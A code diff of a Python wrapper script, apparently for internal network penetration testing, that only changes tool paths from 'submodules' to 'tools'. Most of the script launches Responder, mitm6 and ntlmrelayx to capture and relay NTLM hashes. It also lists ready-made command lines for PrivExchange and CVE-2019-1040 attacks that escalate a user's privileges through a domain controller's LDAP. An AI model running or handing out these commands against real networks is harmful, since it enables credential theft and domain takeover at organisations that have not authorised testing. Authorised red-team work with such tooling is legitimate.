@@ -13,8 +13,8 @@ def create_ntlmrelayx_cmd(args):
     """
     Creates the ntlmrelayx cmommand string
     """
-#    relay_cmd = f'python {cwd}/submodules/impacket/examples/ntlmrelayx.py -of {cwd}/hashes/ntlmrelay-hashes.txt -smb2support'
-    relay_cmd = f'python {cwd}/submodules/ntlmrelayx.py -of {cwd}/hashes/ntlmrelay-hashes.txt -smb2support'
+#    relay_cmd = f'python {cwd}/tools/impacket/examples/ntlmrelayx.py -of {cwd}/hashes/ntlmrelay-hashes.txt -smb2support'
+    relay_cmd = f'python {cwd}/tools/ntlmrelayx.py -of {cwd}/hashes/ntlmrelay-hashes.txt -smb2support'
 
     if args.target:
         target = f' -t {args.target}'
@@ -68,9 +68,9 @@ def start_responder(iface=None):
         iface = get_iface()
     protocols = ['HTTP', 'SMB']
     switch = 'Off'
-    conf = 'submodules/Responder/Responder.conf'
+    conf = 'tools/Responder/Responder.conf'
     edit_responder_conf(switch, protocols, conf)
-    cmd = f'python2 {cwd}/submodules/Responder/Responder.py -wrd -I {iface}'
+    cmd = f'python2 {cwd}/tools/Responder/Responder.py -wrd -I {iface}'
 
     logfile_name = 'responder'
     responder = start_process(cmd, logfile_name)
@@ -78,7 +78,7 @@ def start_responder(iface=None):
     return responder
 
 def start_mitm6(args):
-    cmd = f'python {cwd}/submodules/mitm6.py --ignore-nofqdn'
+    cmd = f'python {cwd}/tools/mitm6.py --ignore-nofqdn'
     if args.domain:
         cmd = cmd + f' -d {args.domain}'
     if args.interface:
@@ -96,22 +96,22 @@ def start_process(cmd, logfile_name):
     return proc
 
 # def start_scanMic(args):
-#     cmd = f'python {cwd}/submodules/cve-2019-1040-scanner/scan.py -target-file exchange-servers.txt {creds}'
+#     cmd = f'python {cwd}/tools/cve-2019-1040-scanner/scan.py -target-file exchange-servers.txt {creds}'
 #     logfile_name = 'scanMic'
 #     scanMic = start_process(cmd, logfile_name)
 #
 #     return scanMic
 
 # regular
-'python {}/submodules/ntlmrelayx.py -tf smb-unsigned-hosts.txt -of {}/hashes-ntlmrelay-hashes -smb2support'
-'python2 {}/submodules/Responder/Responder.py -wrd -I <iface>'
+'python {}/tools/ntlmrelayx.py -tf smb-unsigned-hosts.txt -of {}/hashes-ntlmrelay-hashes -smb2support'
+'python2 {}/tools/Responder/Responder.py -wrd -I <iface>'
 # mitm6
-'python {}/submodules/ntlmrelayx.py -tf smb-unsigned-hosts.txt -6 -wh NetProxy-Service -wa 2 -smb2support'
+'python {}/tools/ntlmrelayx.py -tf smb-unsigned-hosts.txt -6 -wh NetProxy-Service -wa 2 -smb2support'
 'mitm6 -d <domain> --ignore-nofqnd'
-'python2 {}/submodules/Responder/Responder.py -wrd -I <iface>'
+'python2 {}/tools/Responder/Responder.py -wrd -I <iface>'
 # PrivExchange
-'python {}/submodules/ntlmrelayx.py -t ldap://<DC> --remove-mic --escalate-user <UserYouHavePassFor>'
-'python {}/submodules/privexchange.py -ah <AttackerHost> <DC> -u <UserYouHavePassFor> -d testsegment.local'
+'python {}/tools/ntlmrelayx.py -t ldap://<DC> --remove-mic --escalate-user <UserYouHavePassFor>'
+'python {}/tools/privexchange.py -ah <AttackerHost> <DC> -u <UserYouHavePassFor> -d testsegment.local'
 # CVE-2019-1040
 'python printerbug.py <DOMAIN/user>@<exchangeServer> <attacker ip>'
 'ntlmrelayx.py --remove-mic --escalate-user <UserYouHavePassFor> -t ldap://<DC> -smb2support'
